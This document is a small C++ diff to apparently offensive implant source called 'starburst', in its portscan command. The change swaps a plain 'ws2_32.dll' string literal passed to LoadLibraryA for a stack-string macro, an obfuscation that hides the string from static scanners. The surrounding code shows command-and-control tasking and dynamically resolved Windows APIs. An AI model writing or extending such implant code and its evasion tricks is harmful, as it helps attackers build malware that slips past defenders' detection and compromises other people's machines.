@@ -4,6 +4,7 @@
 #include <parser.h>
 #include <config.h>
 #include <strings.h>
+#include <stackstr.h>
 
 #ifdef INCLUDE_CMD_PORTSCAN
 
@@ -102,8 +103,8 @@ auto declfn starburst::cmd_portscan(
     ports_buf[pcopy] = '\0';
 
     // load ws2_32.dll
-    auto h_ws2 = reinterpret_cast<HMODULE>( inst.kernel32.LoadLibraryA(
-        symbol<LPCSTR>( "ws2_32.dll" ) ) );
+    STK_WS2_32(_n);
+    auto h_ws2 = reinterpret_cast<HMODULE>( inst.kernel32.LoadLibraryA( _n ) );
     if ( !h_ws2 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "LoadLibrary ws2_32 failed" ) ) );
